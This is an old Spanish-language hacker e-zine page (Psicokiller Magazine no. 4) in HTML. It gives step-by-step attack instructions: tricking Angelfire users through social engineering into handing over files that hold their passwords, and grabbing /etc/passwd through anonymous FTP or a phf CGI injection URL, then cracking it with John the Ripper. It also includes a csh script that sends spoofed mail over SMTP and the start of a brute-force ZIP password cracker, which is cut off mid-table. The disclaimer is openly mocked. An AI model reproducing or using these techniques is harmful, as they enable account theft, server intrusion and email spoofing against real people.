<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta name="Author" content="Pablo De Marco">
<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
<title>Tha Psicokiller's magazine</title>
</head>
<script language="JavaScript">
function right(e) {
if (navigator.appName == 'Netscape' &&
(e.which == 3 || e.which == 2))
return false;
else if (navigator.appName == 'Microsoft Internet Explorer' &&
(event.button == 2 || event.button == 3)) {
alert("Pagina diseñada por Emiliano   webmaster@suamy.com.ar 							    TEXTOS DE PSICOKILLER");
return false;
}
return true;
}

function keypressed() {
alert("Pagina diseñada por Emiliano   webmaster@suamy.com.ar");
}
document.onmousedown=right;
document.onkeydown=keypressed;

</script>


<body bgcolor="#000000" text="#FFFFFF">

<p>HTTP://WWW.SUAMY.COM.AR <br>
HTTP://WWW.PSICOKILLER.8K.COM <br>
HTTP://WWW.AZMODAN.8M.COM <br>
=========================== <br>
=PSICOKILLER MAGAZINE Nº4&nbsp; = <br>
=========================== </p>

<p>(NO NOS HACEMOS RESPONSABLES DEL MAL USO DE ESTA INFORMACIÓN <br>
ESTA INFORMACIÓN SE OTORGA POR EL SOLO HECHO DE INFORMAR, PERO NO INTENTEN HACER NADA DE
LO QUE DICE ACÁ (jajja cualquiera!!!) </p>

<p>INTRODUCCIÓN: <br>
¨¨¨¨¨¨¨¨¨¨¨¨¨ <br>
Debido a un pequeño problema en el team vmos a cambiar el puto nombre, va, me parece que
la voy a hacer solo, yo, Psicokiller jeje (el nombre), pero la revista va a seguir siendo
la misma, es mas, va a tener mejor calidá, así q' lean, lean y no paren de leer. </p>

<p>INDICE: <br>
¨¨¨¨¨¨¨ <br>
.Abajo las páginas de angelfire <br>
.Hackear páginas (mmmmmmmmm) <br>
.Hackeando los mails <br>
.Crackeame el zip vieja! <br>
.Ping de la muerte <br>
.Putas PC's con llave de mierda </p>

<p>=*=*=*=*==*=*=*=*=*=*=*=*=*=*=*=*=*=*=*==*=*=*=*=*=*=*==*=*==*=*=*=*=*=*=*=*=* <br>
MUEREEEEEEE!!!! ANGELFIRE!!!!! <br>
============================== </p>

<p>Lo primero que debes de saber es que la contraseña y el nombre de usuario <br>
de todos los usuarios de este sistema se puede ver a traves de una pagina <br>
que te sale nada mas entrar con el nombre de usuario (login) y contraseña, <br>
este archivo se llama BEDIT.HTML en donde se encuentra el password y el <br>
nombre de usuario. El susodicho archivo se parece mas o menos a esto: </p>

<p>&lt;font color=teal&gt;Tu Pagina &lt;a
href=&quot;http://www.angelfire.com/pa/kalimotxo1/index.html&quot;&gt; <br>
http://www.angelfire.com/pa/KALIMOTXO/index.html &lt;/a&gt; <br>
has been saved.&lt;br&gt;You may have to click Reload or Super-Reload (Shift+Reload) to <br>
see your edited page and not your old version when you go to your URL.&lt;br&gt;You <br>
can also announce your new page on &lt;a
href=&quot;http://homepages.whowhere.com/bin/showpage.pl?add&quot;&gt;WhoWhere?&lt;/a&gt;,
&lt;a href=&quot;http://newtoo.manifest.com/&quot;&gt; <br>
&lt;u&gt;What's New Too!&lt;/u&gt;&lt;/a&gt;, or if you really want to get noticed, go to
&lt;a href=&quot;http://www.submit-it.com/&quot;&gt;&lt;u&gt;Submit
It!&lt;/u&gt;&lt;/a&gt;&lt;br&gt;Tune up <br>
your Web Site at the &lt;a
href=&quot;http://www.angelfire.com/cgi-bin/ct?ad=websitegarage&amp;vp=/index.clicked&amp;ru=http://www.websitegarage.com/whowhere&quot;&gt;Web
Site Garage&lt;/a&gt;.&lt;/font&gt; <br>
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/center&gt; <br>
&lt;form select method=&quot;post&quot;
action=&quot;http://www.angelfire.com/cgi-bin/bedit&quot;&gt; <br>
&lt;input type=&quot;hidden&quot; name=&quot;storage&quot;&nbsp;
value=&quot;pa&quot;&gt;&nbsp;&nbsp; &lt;:::::::::Nombre del directorio. <br>
&lt;input type=&quot;hidden&quot; name=&quot;hpd&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
value=&quot;kalimotxo&quot;&gt; <br>
&lt;input type=&quot;hidden&quot; name=&quot;password&quot;
value=&quot;kalimotxo1&quot;&gt;&nbsp; &lt;::La contraseña </p>

<p>Verdad que no ha sido dificil encontrar donde se encuentra situado la <br>
contraseña en el archivo??pos bueno, el nombre de usuario es aun mas facil <br>
en este caso el nombre de usuario es &quot;kalimotxo1&quot;, siempre sera la palabra <br>
que viene despues del directorio (la palabra de dos letras). <br>
Ej: http://www.angelfire.com/**/nombredelusuario/ <br>
**= nombre del directorio. </p>

<p>Pasos a seguir: <br>
-Consigue que algun boludon te pase su BEDIT.HTML para esto utiliza la <br>
imaginacion y la ingenieria social. <br>
-Cuando el muy pelotudo te haya pasado el archivo saca la informacion que <br>
necesitas. <br>
-Otra cosa que debes hacer es visualizar el BEDIT.HTML del pelotudo en tu <br>
disco duro y pinchar en lo de cambiar el e-mail (pon uno anonimo gratuito <br>
pe: el hotmail). </p>

<p>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ <br>
Hackear páginas (mmmmmmmmm) <br>
=========================== </p>

<p>Lo primero es lo primero, que es buscar un objetivo que merezca la pena, <br>
para este truco debera ser un servidor con poca (casi nula) seguridad. <br>
&nbsp;Ahora deberas conectarte via telnet o ftp a su servidor de ftp de forma <br>
anonima, y en el directorio &quot;ETC&quot; tienes un archivo que se llama <br>
&quot;passwd&quot;&nbsp; que deberas de pillar. Otra manera es el truco del phf, el cual
ya <br>
no funciona en mas del 95% de los servidores de internet, es mas, en <br>
algunos como Sony te mandaran una bomba de Netscape (no hace na de gracia), <br>
para usar el truco del phf escribe esta direccion en el navegador: <br>
http://www.servidor.es/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd <br>
(cambia servidor.es por lo que corresponda). <br>
&nbsp;Entonces ya tienes el archivo de contraseñas, lo siguiente es investigarlo: <br>
posiblemente te encuentres un archivo sin cuentas de usuarios, pero <br>
un archivo solo con cuentas por defecto, en las cuales la contraseña encriptada <br>
sera * . En algunos servidores el * significara que tienes un archivo con <br>
contraseñas shadowed (sombreadas), pero en las cuentas que son por defecto <br>
(NEWS, FTP, GUEST, etc...) si te encuentras como contraseña * es que no <br>
tienen contraseña y ha sido reemplazado por *. Si has encontrado esto, <br>
has encontrado un passwd &quot;fixed&quot; y necesitaras usar otro modo para hackear <br>
este servidor. Bueno, partimos de la base de3 que has encontrado cuentas <br>
en el passwd de las buenas con contraseña encriptada, que son los que se <br>
parecen mas o menos a esto: <br>
lina:li16uG4bdxujM:544:100::/wd/home/lina:/bin/bash <br>
&nbsp;De esto con lo que nos quedamos es con: lina y con li16uG4bdxujM <br>
estos dos elementos son el login y el password, si te das cuentas la <br>
contraseña encriptada empieza siempre pos dos caracteres Ascii, que son <br>
las dos primeras letras del password, en muchos casos si empieza como <br>
el login es posible que la contraseña sea la misma que el login (en el <br>
ejemplo pasa esto), pero esto es solo una suposicion y no siempre pasa, <br>
asi que lo que tienes que pillar es un programa como el John DeRipper <br>
(Es el mejor en su genero) para desencriptar las contraseñas (Lo teneis <br>
en mi web). Para ver todos los comandos de este programa en el prompt del <br>
dos escribe &quot;john&quot; y los veras todos (De todas formas a ver si me animo y <br>
traduzco sus instrucciones). </p>

<p>[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][] <br>
Hackeando los mails <br>
=================== </p>

<p>Antes que nada , que es para ti hackear ? Yo no lo se con <br>
&nbsp; exactitud , pero te puedo decir que ahora explicaremos como y <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; porque se puede hackear un correo electronico
... </p>

<p>&nbsp;Para comenzar , para poder mandar/recibir correo , la maquina <br>
&nbsp;&nbsp; receptora/mandadora de este correo debe tener corriendo un <br>
&nbsp; demonio administrador de mensajes , que en el caso de unix se <br>
&nbsp; trata del demonio del sendmail , el cual tiene muchas versiones <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; distintas , pero trabajan en
forma similar . </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp; Todo demonio corre por algun puerto de esta maquina <br>
&nbsp;susodicha , y este demonio corre exactamente por la puerta 25 . </p>

<p>&nbsp;&nbsp; Si te conectas en forma directa por un telnet a esta puerta , <br>
podras ver que quedas suspendido dentro del demonio , lo que te <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; permite mandar un mensaje , como lo hago
?? . </p>

<p>&nbsp;&nbsp;&nbsp; Fácil , primero debes tipear el comando helo , para que el <br>
sendmail te reconozca , y luego le mandas los datos del receptor , <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tipeando
rcpt to:user@host.domain . </p>

<p>&nbsp;Luego , tipeas el mandante del mail asi como sigue , mail from: <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
desde@host.domain . </p>

<p>&nbsp;Ahora , solo pones el comando DATA , y a ponerse a escribir se <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ha dicho !!! . <br>
&nbsp;Para terminar el modo texto , solo terminas con un &quot;.&quot; , y luego <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
colocas quit . </p>

<p>En todo caso , aquí les hago entrega del script (utilizable en unix) </p>

<p>------------------------- cut here ------------------------ </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
#! /bin/csh -f </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
# version 1.0 by Psicokiller </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
clear </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo <br>
'*************************************************************************' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo '* m a i l h a c k *' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo <br>
'*************************************************************************' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo ' ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo 'by Psicokiller, El capo . ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo 'email: sk8@uol.com.ar ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo ' ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo -n 'Dame el login de la persona que
recibira el mail: ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
set ulog=$&lt; </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo -n 'Dame el nombre de la maquina
de la persona: ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
set uhost=$&lt; </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
# dejo en la variable hlog el user hacked </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo -n 'Dame el
login facked que quieres usar: ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
set hlog=$&lt; </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # dejo
en la variable hackhost el faked host </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo -n 'Dame la faked
maquina a usar en el mail: ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
set hackhost=$&lt; </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # dejo en usehost el servidor de mails al que nos
conectaremos </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo -n 'A que host conectamos (se recomienda
localhost)?: ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
set usehost=$&lt; </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp; # dejo en editor el editor que usaremos para escribir el
cuerpo del </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
# mail , default : vi </p>

<p>&nbsp;&nbsp;&nbsp; echo -n 'Que editor vamos a usar para editar el mail(return para
vi)? ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
set editor=$&lt; </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if($editor ==&quot;&quot;) then </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
set editor=vi </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
endif </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # dejo todas nuestras variables en un archivo llamado
mailhack </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo 'HELO' &gt;&gt; mailhack </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo 'Mail from:
'$hlog@$hackhost &gt;&gt; mailhack </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo
'RCPT to: '$ulog@$uhost &gt;&gt; mailhack </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo 'DATA' &gt;&gt; mailhack </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
# edito el cuerpo del articulo (mhack) </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
$editor mhack </p>

<p>&nbsp;&nbsp;&nbsp; # limpio la pantalla y pregunto si esta' seguro o no de mandar el
mail. </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
clear </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo -n ' Are you sure ? (y/n) ' </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
set yorn=$&lt; </p>

<p>&nbsp;&nbsp; # si esta' seguro (yorn=y) pone un punto y un quit en el archivo del mail </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if($yorn == 'y') then </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo . &gt;&gt; mhack </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
echo quit &gt;&gt; mhack </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cat mhack &gt;&gt; mailhack </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # me conecto al port del servidor de mails y le dejo mi
hackmail </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
telnet $usehost 25 &lt; mailhack &gt; /dev/null </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
endif </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
# borro mis 2 archivos de hackeo </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
rm mhack mailhack </p>

<p>---------------------- cut here ------------------------- <br>
****************************************************************************** <br>
Crackeame el zip vieja! <br>
======================= <br>
Este es un programa para c++ q' crackea zip's <br>
---------------cut here-------------- <br>
program zipcrack; </p>

<p>{$M 16384, 0, 65536} </p>

<p>{-----------------------------------------------------------------------} <br>
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} <br>
{ Program ZIPCRACK Copyright 1993 by Psicokiller&nbsp;&nbsp;&nbsp; } <br>
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} <br>
{ Brute force attack on PKZIP V2 encryption.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
{ Based on the APPNOTE.TXT distributed with the registered version&nbsp; } <br>
{ of PKZIP
2.04g.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} <br>
{ Method: Generate all possible passwords; invoke PKUNZIP -t (test)&nbsp; } <br>
{ option to test each
password.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} <br>
{ Input: Minimum and maximum password lengths, password character set, } <br>
{ Zipfile name, name of file to extract.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} <br>
{ Options: Interval to save last password attempted; this allows the } <br>
{ program to be
restarted.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} <br>
{ Performance improvements: placing PKUNZIP and the Zipfile on a RAM } <br>
{ disk will improve speed. Increasing the 'save' interval will also&nbsp; } <br>
{ increase speed. Making the current directory a RAM disk is _NOT_&nbsp; } <br>
{ recommended, since a crash (power hit, etc.) will lose the saved&nbsp; } <br>
{ 'last password' and you will have to restart from scratch.&nbsp;&nbsp; } <br>
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} <br>
{-----------------------------------------------------------------------} </p>

<p>uses <br>
&nbsp;DOS, <br>
&nbsp;CRT; </p>

<p>const <br>
&nbsp;SaveFN&nbsp; = 'ZIPCRACK.$$$';&nbsp; { Save file name&nbsp;&nbsp;&nbsp; } <br>
&nbsp;WorkDir&nbsp; = '\ZIPCRACK';&nbsp;&nbsp; { Work Subdirectory&nbsp;&nbsp;&nbsp; } <br>
&nbsp;MAXPW&nbsp; = 256;&nbsp;&nbsp;&nbsp;&nbsp; { Max Password Length&nbsp;&nbsp; } <br>
&nbsp;MAXBUF&nbsp; = 32768;&nbsp;&nbsp;&nbsp; { Max buffer length&nbsp;&nbsp;&nbsp; } <br>
&nbsp;K0&nbsp;&nbsp;&nbsp; = 305419896;&nbsp;&nbsp; { Zipfile Encryption Initializer} <br>
&nbsp;K1&nbsp;&nbsp;&nbsp; = 591751049;&nbsp;&nbsp; { Zipfile Encryption Initializer} <br>
&nbsp;K2&nbsp;&nbsp;&nbsp; = 878082192;&nbsp;&nbsp; { Zipfile Encryption Initializer} <br>
&nbsp;ZIPHDRSIG = $04034B50;&nbsp;&nbsp; { Zip Local Header Signature } <br>
&nbsp;ZDHDRSIG = $02014B50;&nbsp;&nbsp; { Zip Directory Header Signature} <br>
&nbsp;ZDENDSIG = $06054B50;&nbsp;&nbsp; { Zip Directory End Signature } </p>

<p>const <br>
&nbsp;CrcTab : array [0..255] of LongInt = <br>
&nbsp; ( <br>
&nbsp;&nbsp; $00000000, $77073096, $EE0E612C, $990951BA, <br>
&nbsp;&nbsp; $076DC419, $706AF48F, $E963A535, $9E6495A3, <br>
&nbsp;&nbsp; $0EDB8832, $79DCB8A4, $E0D5E91E, $97D2D988, <br>
&nbsp;&nbsp; $09B64C2B, $7EB17CBD, $E7B82D07, $90BF1D91, <br>
&nbsp;&nbsp; $1DB71064, $6AB020F2, $F3B97148, $84BE41DE, <br>
&nbsp;&nbsp; $1ADAD47D, $6DDDE4EB, $F4D4B551, $83D385C7, <br>
&nbsp;&nbsp; $136C9856, $646BA8C0, $FD62F97A, $8A65C9EC, <br>
&nbsp;&nbsp; $14015C4F, $63066CD9, $FA0F3D63, $8D080DF5, <br>
&nbsp;&nbsp; $3B6E20C8, $4C69105E, $D56041E4, $A2677172, <br>
&nbsp;&nbsp; $3C03E4D1, $4B04D447, $D20D85FD, $A50AB56B, <br>
